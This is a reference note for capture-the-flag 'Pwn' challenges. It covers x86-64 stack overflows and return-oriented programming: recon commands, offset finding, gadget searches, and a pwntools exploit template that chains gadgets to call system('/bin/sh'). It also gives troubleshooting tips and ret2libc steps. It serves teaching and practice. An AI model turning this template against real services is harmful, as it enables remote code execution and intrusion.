# Stack overflow and ROP on x86-64

**English** | [🇪🇸 Español](rop-stack.md)

Reference note for Pwn challenges: from an unbounded `read()` to a shell, and what breaks a chain that already looks right.

## 1. Recon

```bash
file ./challenge
checksec --file=./challenge
readelf -hW ./challenge | grep Type
```

| Protection | What it means |
|---|---|
| NX | stack is not executable → ROP or `mprotect` |
| PIE | randomised addresses → you need a leak |
| Canary | detects the overwrite before `ret` → must be leaked |
| RELRO | read-only GOT when *full* |
| Fortify | `read`/`memcpy` check the size |

## 2. Exact offset

```bash
python3 - <<'PY'
from pwn import *
print(cyclic(300).decode())
PY
```

Send the pattern, read `RIP` at the crash and look it up:

```bash
python3 -c "from pwn import *; print(cyclic_find(0x6161616c))"
```

With `gdb` + `pwndbg`: `pattern create 300`, `pattern offset $rsp`. For `scanf("%s")` the offset is buffer size + 8 (saved RBP).

## 3. Gadgets and functions

```bash
ROPgadget --binary ./challenge | grep -E "pop rdi|pop rsi|syscall|leave"
objdump -d ./challenge | grep -E "<(system|execve|win)@plt>"
strings -a -t x ./challenge | grep "/bin/sh"
```

- `system("/bin/sh")`: `pop rdi; ret` + string address + `system@plt`.
- `execve("/bin/sh", 0, 0)`: `pop rdi`, `pop rsi`, `pop rdx` and `syscall`.
- No `/bin/sh`: write it to `.bss` with `read`/`gets` and call again.

## 4. Template

```python
from pwn import *
context.binary = elf = ELF('./challenge')
context.log_level = 'debug'

OFF = <offset>
POP_RDI = <gadget>
RET = <gadget ret>          # alignment

def exploit(p):
    payload  = b'A' * OFF
    payload += p64(RET)      # 16-byte stack alignment
    payload += p64(POP_RDI) + p64(next(elf.search(b'/bin/sh')))
    payload += p64(elf.plt['system'])
    p.sendlineafter(b'> ', payload)

p = process('./challenge')
exploit(p)
p.interactive()
```

## 5. When it fails

| Symptom | Likely cause |
|---|---|
| `SIGSEGV` before `ret` | wrong offset or a canary |
| `system` crashes in `do_system` | misaligned stack: add a `ret` |
| `system` prints nothing | process closes stdin; use `cat flag` or `sh -c` |
| Works locally, not remotely | different libc: use the challenge libc |
| `Bad address` in `execve` | garbage in `rsi`/`rdx`: zero them |

## 6. Without `pop rdi`

- `__libc_csu_init` to chain registers.
- `ret2dlresolve` when there is no `system@plt` and no leak.
- `SROP` with `sigreturn` if you control `rax`.
- Format string (`%n`) to write the GOT when it is writable.

## 7. Ret2libc with a leak

1. Leak `puts@got` via `pop rdi; ret`.
2. Return to `main` for a second payload.
3. Compute the libc base: `leak - libc.symbols['puts']`.
4. Second payload: `system` + libc's `/bin/sh`.

## Lessons

- Always measure the offset; 90% of failures come from it or alignment.
- Without PIE the challenge is shorter: fixed gadgets and `plt`.
- Record the challenge's libc; without it the exploit is not reproducible.

MITRE: T1203, T1059.004.
